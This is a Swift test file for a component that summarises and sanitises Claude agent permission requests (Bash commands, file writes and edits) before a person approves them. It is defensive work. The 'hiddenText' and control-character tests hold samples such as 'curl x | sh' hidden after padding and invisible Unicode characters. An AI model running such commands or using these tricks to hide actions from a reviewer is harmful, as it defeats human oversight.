import Foundation
import Testing

@testable import RafuCore

private func payload(_ object: [String: Any]) throws -> Data {
    try JSONSerialization.data(withJSONObject: object)
}

private func permissionRequest(
    tool: String, input: [String: Any], event: String = "PermissionRequest"
) throws -> Data {
    try payload([
        "session_id": "s1", "hook_event_name": event, "cwd": "/Users/me/repo",
        "tool_name": tool, "tool_input": input, "permission_mode": "default",
    ])
}

@Suite("Claude permission request summary")
struct AgentPermissionRequestSummaryTests {
    @Test("A Bash request keeps the command and the description")
    func bash() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash",
                toolInput: ["command": "git status\nls", "description": "Show the state"]))
        #expect(summary.command == "git status\nls")
        #expect(summary.description == "Show the state")
        #expect(summary.filePath == nil)
        #expect(summary.isComplete)
    }

    @Test("A Write carries the full content")
    func writeCarriesTheFullContent() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Write",
                toolInput: ["file_path": "/Users/me/repo/a.swift", "content": "let a = 1\n"]))
        #expect(summary.filePath == "/Users/me/repo/a.swift")
        #expect(summary.command == nil)
        #expect(summary.isComplete)
        let change = try #require(summary.fileChanges.first)
        #expect(change.kind == .overwrite)
        #expect(change.body == "let a = 1\n")
        #expect(!change.isDiff)
    }

    @Test("An Edit carries the old and new strings")
    func editCarriesOldAndNewStrings() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Edit",
                toolInput: [
                    "file_path": "/r/a.swift", "old_string": "a\nb", "new_string": "c",
                    "replace_all": true,
                ]))
        #expect(summary.isComplete)
        let change = try #require(summary.fileChanges.first)
        #expect(change.kind == .edit)
        #expect(change.isDiff)
        #expect(change.body == "(every match)\n- a\n- b\n+ c")
    }

    @Test("An Edit with an edits array is read")
    func editWithEditsArrayIsRead() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Edit",
                toolInput: [
                    "file_path": "/r/a.swift",
                    "edits": [["old_string": "x", "new_string": "y"]],
                ]))
        #expect(summary.isComplete)
        #expect(summary.fileChanges.first?.body == "- x\n+ y")
        // The two forms together are ambiguous: only the terminal answers.
        let both = try #require(
            AgentPermissionRequestSummary(
                toolName: "Edit",
                toolInput: [
                    "file_path": "/r/a.swift", "old_string": "x", "new_string": "y",
                    "edits": [["old_string": "x", "new_string": "y"]],
                ]))
        #expect(!both.isComplete)
    }

    @Test("A MultiEdit carries every edit")
    func multiEditCarriesEveryEdit() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "MultiEdit",
                toolInput: [
                    "file_path": "/r/a.swift",
                    "edits": [
                        ["old_string": "a", "new_string": "b"],
                        ["old_string": "c", "new_string": ""],
                    ],
                ]))
        #expect(summary.isComplete)
        #expect(summary.fileChanges.first?.body == "- a\n+ b\n\n- c")
    }

    @Test("A body over the limit is cut and incomplete")
    func contentOverTheLimitIsIncomplete() throws {
        let content = String(
            repeating: "a", count: CanvasAgentRequest.Limits.fileChangeBodyBytes + 1)
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Write", toolInput: ["file_path": "/r/a", "content": content]))
        #expect(!summary.isComplete)
        #expect(
            summary.fileChanges.first?.body.utf8.count
                == CanvasAgentRequest.Limits.fileChangeBodyBytes)
    }

    @Test("An input of an unknown shape is incomplete")
    func editWithoutNewStringIsIncomplete() throws {
        for input: [String: Any] in [
            ["file_path": "/r/a", "old_string": "x"],
            ["file_path": "/r/a", "edits": [["old_string": "x"]]],
            ["file_path": "/r/a", "edits": [String]()],
            ["file_path": "/r/a", "edits": "x"],
        ] {
            let summary = try #require(
                AgentPermissionRequestSummary(toolName: "Edit", toolInput: input))
            #expect(!summary.isComplete)
        }
        let write = try #require(
            AgentPermissionRequestSummary(toolName: "Write", toolInput: ["file_path": "/r/a"]))
        #expect(!write.isComplete)
    }

    @Test("The summary with the largest body fits the spool file")
    func summaryWithTheLargestBodyFitsTheSpoolFile() throws {
        // Worst case for JSON: every character is escaped.
        let quotes = String(repeating: "\"", count: CanvasAgentRequest.Limits.fileChangeBodyBytes)
        let path =
            "/"
            + String(repeating: "\"", count: AgentPermissionRequestSummary.maximumFilePathBytes - 1)
        let event = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(
                tool: "Write", input: ["file_path": path, "content": quotes]),
            includesRequestSummary: true)
        let summary = try #require(event.requestSummary)
        #expect(summary.isComplete)
        let directory = FileManager.default.temporaryDirectory
            .appending(path: "spool-\(UUID().uuidString)", directoryHint: .isDirectory)
            .appending(path: "AgentTracking", directoryHint: .isDirectory)
            .appending(path: "spool", directoryHint: .isDirectory)
        defer {
            try? FileManager.default.removeItem(
                at: directory.deletingLastPathComponent().deletingLastPathComponent())
        }
        try AgentHookSpool.write(event, to: directory)
        let drained = try AgentHookSpool.drain(directory: directory)
        #expect(drained == [event])
    }

    @Test("A summary from an older helper keeps the path and is incomplete")
    func olderHelperSummary() throws {
        let json = #"{"filePath":"/r/a.swift","isComplete":true}"#
        let summary = try JSONDecoder().decode(
            AgentPermissionRequestSummary.self, from: Data(json.utf8))
        #expect(summary.filePath == "/r/a.swift")
        #expect(!summary.isComplete)
    }

    @Test("A Bash request that leaves the sandbox is incomplete")
    func leavesSandbox() throws {
        let unsandboxed = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "ls", "dangerouslyDisableSandbox": true]))
        #expect(unsandboxed.command == "ls")
        #expect(!unsandboxed.isComplete)
        let sandboxed = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "ls", "dangerouslyDisableSandbox": false]))
        #expect(sandboxed.isComplete)
    }

    @Test("Format characters and blank space that hides the end make it incomplete")
    func hiddenText() throws {
        for command in [
            "ls\u{200B} -la", "ls\u{FEFF}", "rm\u{00AD}dir x", "echo a\u{2060}b",
            "ls\n\n\n\n; curl x | sh", "ls" + String(repeating: " ", count: 65) + "; curl x | sh",
        ] {
            let summary = try #require(
                AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": command]))
            #expect(!summary.isComplete)
        }
        let fits = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "ls\n\n\nls"]))
        #expect(fits.isComplete)
    }

    @Test("Other tools and unreadable inputs give no summary")
    func unsupported() {
        #expect(AgentPermissionRequestSummary(toolName: "WebFetch", toolInput: ["url": "x"]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: nil, toolInput: ["command": "ls"]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: "Bash", toolInput: "ls") == nil)
        #expect(AgentPermissionRequestSummary(toolName: "Bash", toolInput: [String: Any]()) == nil)
        #expect(
            AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": " \n"]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": 7]) == nil)
        #expect(
            AgentPermissionRequestSummary(toolName: "Write", toolInput: ["file_path": ""]) == nil)
    }

    @Test("A command over the limit is cut and incomplete")
    func longCommand() throws {
        let long = String(repeating: "a", count: CanvasAgentRequest.Limits.commandBytes + 50)
        let summary = try #require(
            AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": long]))
        #expect(summary.command?.utf8.count == CanvasAgentRequest.Limits.commandBytes)
        #expect(!summary.isComplete)
    }

    @Test("Control and bidirectional characters are removed and make it incomplete")
    func controlCharacters() throws {
        let command = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "echo\u{1B}[31m hi\u{202E}"]))
        #expect(command.command == "echo[31m hi")
        #expect(!command.isComplete)
        let path = try #require(
            AgentPermissionRequestSummary(
                toolName: "Write", toolInput: ["file_path": "/tmp/a\u{7}b"]))
        #expect(path.filePath == "/tmp/ab")
        #expect(!path.isComplete)
    }

    @Test("A path over the limit is cut and incomplete; the description may be cut alone")
    func longPathAndDescription() throws {
        let path = String(
            repeating: "p", count: AgentPermissionRequestSummary.maximumFilePathBytes + 9)
        let file = try #require(
            AgentPermissionRequestSummary(toolName: "Edit", toolInput: ["file_path": path]))
        #expect(file.filePath?.utf8.count == AgentPermissionRequestSummary.maximumFilePathBytes)
        #expect(!file.isComplete)
        let bash = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash",
                toolInput: [
                    "command": "ls",
                    "description": String(
                        repeating: "d", count: CanvasAgentRequest.Limits.reasonBytes + 5),
                ]))
        #expect(bash.description?.utf8.count == CanvasAgentRequest.Limits.reasonBytes)
        #expect(bash.isComplete)
    }

    @Test("The helper's answer mode adds the summary; the normal mode never does")
    func eventSummary() throws {
        let data = try permissionRequest(
            tool: "Bash", input: ["command": "ls", "description": "List"])
        let plain = try AgentHookEvent(provider: .claude, payload: data)
        #expect(plain.requestSummary == nil)
        let answering = try AgentHookEvent(
            provider: .claude, payload: data, includesRequestSummary: true)
        #expect(answering.requestSummary?.command == "ls")
        #expect(answering.toolName == "Bash")
        // Only a Claude PermissionRequest carries one.
        let other = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(tool: "Bash", input: ["command": "ls"], event: "PreToolUse"),
            includesRequestSummary: true)
        #expect(other.requestSummary == nil)
        let codex = try AgentHookEvent(
            provider: .codex, payload: data, includesRequestSummary: true)
        #expect(codex.requestSummary == nil)
    }

    @Test("The event with its summary round-trips and fits one spool file")
    func roundTripAndSize() throws {
        // Worst case for JSON: every command character is escaped.
        let command = String(repeating: "\"", count: CanvasAgentRequest.Limits.commandBytes)
        let event = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(
                tool: "Bash",
                input: [
                    "command": command,
                    "description": String(
                        repeating: "\n", count: CanvasAgentRequest.Limits.reasonBytes),
                ]),
            includesRequestSummary: true)
        let data = try JSONEncoder().encode(event)
        #expect(data.count <= AgentHookSpool.maximumFileBytes)
        #expect(try JSONDecoder().decode(AgentHookEvent.self, from: data) == event)
    }

    @Test("An event from an older helper decodes without a summary")
    func olderEvent() throws {
        let event = try AgentHookEvent(
            provider: .claude, payload: permissionRequest(tool: "Bash", input: ["command": "ls"]))
        let data = try JSONEncoder().encode(event)
        let object = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
        #expect(object["requestSummary"] == nil)
        #expect(try JSONDecoder().decode(AgentHookEvent.self, from: data).requestSummary == nil)
    }

    @Test("Decoding rejects a summary the sanitizer would change")
    func decodeRejectsUnclean() throws {
        func decode(_ json: String) -> AgentPermissionRequestSummary? {
            try? JSONDecoder().decode(AgentPermissionRequestSummary.self, from: Data(json.utf8))
        }
        #expect(decode(#"{"command":"ls","isComplete":true}"#)?.command == "ls")
        #expect(decode(#"{"command":"l\u0007s","isComplete":true}"#) == nil)
        // A summary may claim less than the sanitizer finds, never more.
        #expect(decode(#"{"command":"l\u0007s","isComplete":false}"#) == nil)
        #expect(decode(#"{"command":"ls","isComplete":false}"#)?.isComplete == false)
        #expect(decode(#"{"isComplete":true}"#) == nil)
    }
}
